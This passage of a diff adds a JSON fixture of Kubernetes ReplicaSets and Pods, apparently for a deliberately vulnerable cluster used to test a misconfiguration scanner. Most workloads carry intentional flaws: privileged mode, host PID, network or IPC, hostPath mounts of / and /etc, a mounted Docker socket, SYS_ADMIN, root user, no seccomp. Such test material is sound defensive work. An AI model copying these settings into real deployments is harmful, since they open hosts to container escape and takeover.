+    "name": "gap-untrusted-registry-4fgztdx64m",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "gap-untrusted-registry"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "gap-untrusted-registry",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "gap-untrusted-registry"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "gap-untrusted-registry"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.untrusted.invalid/team/app:2.0",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "ap-frontend-djt8xmmh7m",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "ap-frontend"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "ap-frontend",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "ap-frontend"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "ap-frontend"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": true,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         },
+         "privileged": true
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ],
+      "serviceAccountName": "ap-frontend-sa"
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "prio-isolated-5l6wcsx8jb",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "prio-isolated"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "prio-isolated",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "prio-isolated"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "prio-isolated"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": true,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         },
+         "privileged": true
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "prio-vuln-exposed-lxt7bcwllq",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "prio-vuln-exposed"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "prio-vuln-exposed",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "prio-vuln-exposed"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "prio-vuln-exposed"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "nginx:1.14.0",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "100m",
+          "memory": "64Mi"
+         },
+         "requests": {
+          "cpu": "10m",
+          "memory": "16Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "ReplicaSet",
+   "metadata": {
+    "name": "neg-api-ktxknd2qlw",
+    "namespace": "dvka-secure",
+    "labels": {
+     "app": "neg-api"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Deployment",
+      "name": "neg-api",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "selector": {
+     "matchLabels": {
+      "app": "neg-api"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "neg-api"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ],
+      "serviceAccountName": "neg-api-sa"
+     }
+    }
+   }
+  }
+ ],
+ "pods": [
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-privileged-zxr89df2x8-jpflj",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-privileged"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "wl-privileged-zxr89df2x8",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": true,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       },
+       "privileged": true
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.3",
+    "podIPs": [
+     {
+      "ip": "10.244.0.3"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-host-pid-qlb79lrqhn-nhv2t",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-host-pid"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "wl-host-pid-qlb79lrqhn",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "hostPID": true,
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.4",
+    "podIPs": [
+     {
+      "ip": "10.244.0.4"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-host-network-dbl8b",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-host-network"
+    },
+    "ownerReferences": [
+     {
+      "kind": "DaemonSet",
+      "name": "wl-host-network",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "hostNetwork": true,
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.5",
+    "podIPs": [
+     {
+      "ip": "10.244.0.5"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-host-ipc-0",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-host-ipc"
+    },
+    "ownerReferences": [
+     {
+      "kind": "StatefulSet",
+      "name": "wl-host-ipc",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "hostIPC": true,
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.6",
+    "podIPs": [
+     {
+      "ip": "10.244.0.6"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-hostpath-etc-rvqxw729w7-vhsgg",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-hostpath-etc"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "wl-hostpath-etc-rvqxw729w7",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      },
+      "volumeMounts": [
+       {
+        "name": "h",
+        "mountPath": "/host-etc"
+       }
+      ]
+     }
+    ],
+    "volumes": [
+     {
+      "name": "h",
+      "hostPath": {
+       "path": "/etc"
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.7",
+    "podIPs": [
+     {
+      "ip": "10.244.0.7"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-hostpath-root-6mdfh57czx-9kxt2",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-hostpath-root"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "wl-hostpath-root-6mdfh57czx",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      },
+      "volumeMounts": [
+       {
+        "name": "h",
+        "mountPath": "/host"
+       }
+      ]
+     }
+    ],
+    "volumes": [
+     {
+      "name": "h",
+      "hostPath": {
+       "path": "/"
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.8",
+    "podIPs": [
+     {
+      "ip": "10.244.0.8"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-hostpath-writable-qx9ggs2z7c-mlqjc",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-hostpath-writable"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "wl-hostpath-writable-qx9ggs2z7c",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      },
+      "volumeMounts": [
+       {
+        "name": "h",
+        "mountPath": "/data"
+       }
+      ]
+     }
+    ],
+    "volumes": [
+     {
+      "name": "h",
+      "hostPath": {
+       "path": "/var/log/dvka"
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.9",
+    "podIPs": [
+     {
+      "ip": "10.244.0.9"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-docker-socket-rphnh2l5h6-h8452",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-docker-socket"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "wl-docker-socket-rphnh2l5h6",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      },
+      "volumeMounts": [
+       {
+        "name": "d",
+        "mountPath": "/var/run/docker.sock"
+       }
+      ]
+     }
+    ],
+    "volumes": [
+     {
+      "name": "d",
+      "hostPath": {
+       "path": "/var/run/docker.sock"
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.10",
+    "podIPs": [
+     {
+      "ip": "10.244.0.10"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-cap-sys-admin-5cv4n7ggfz-s9vj8",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-cap-sys-admin"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "wl-cap-sys-admin-5cv4n7ggfz",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ],
+        "add": [
+         "SYS_ADMIN"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.11",
+    "podIPs": [
+     {
+      "ip": "10.244.0.11"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-caps-not-dropped-tcp7ns4f62-6m9pw",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-caps-not-dropped"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "wl-caps-not-dropped-tcp7ns4f62",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {}
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.12",
+    "podIPs": [
+     {
+      "ip": "10.244.0.12"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-allow-privesc-d9r2vb2h6z-4rdhg",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-allow-privesc"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "wl-allow-privesc-d9r2vb2h6z",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": true,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.13",
+    "podIPs": [
+     {
+      "ip": "10.244.0.13"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-run-as-root-ztpzmq58fh-jj9ww",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-run-as-root"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "wl-run-as-root-ztpzmq58fh",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       },
+       "runAsUser": 0,
+       "runAsNonRoot": false
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.14",
+    "podIPs": [
+     {
+      "ip": "10.244.0.14"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-writable-rootfs-5lnqvqslx8-fdpp5",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-writable-rootfs"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "wl-writable-rootfs-5lnqvqslx8",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": false,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.15",
+    "podIPs": [
+     {
+      "ip": "10.244.0.15"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-no-seccomp-f9rqlhlzsk-wzf5t",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-no-seccomp"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "wl-no-seccomp-f9rqlhlzsk",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.16",
+    "podIPs": [
+     {
+      "ip": "10.244.0.16"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-no-limits-xknd6nr2bq-vdrrd",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-no-limits"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "wl-no-limits-xknd6nr2bq",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.17",
+    "podIPs": [
+     {
+      "ip": "10.244.0.17"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-sa-automount-ctb8fvvkfr-ggd5c",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-sa-automount"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "wl-sa-automount-ctb8fvvkfr",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.18",
+    "podIPs": [
+     {
+      "ip": "10.244.0.18"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-latest-tag-g9b5nhndlt-kzwhw",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-latest-tag"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "wl-latest-tag-g9b5nhndlt",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:latest",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.19",
+    "podIPs": [
+     {
+      "ip": "10.244.0.19"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-untagged-image-4jrmzqnj8k-rdbml",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-untagged-image"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "wl-untagged-image-4jrmzqnj8k",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
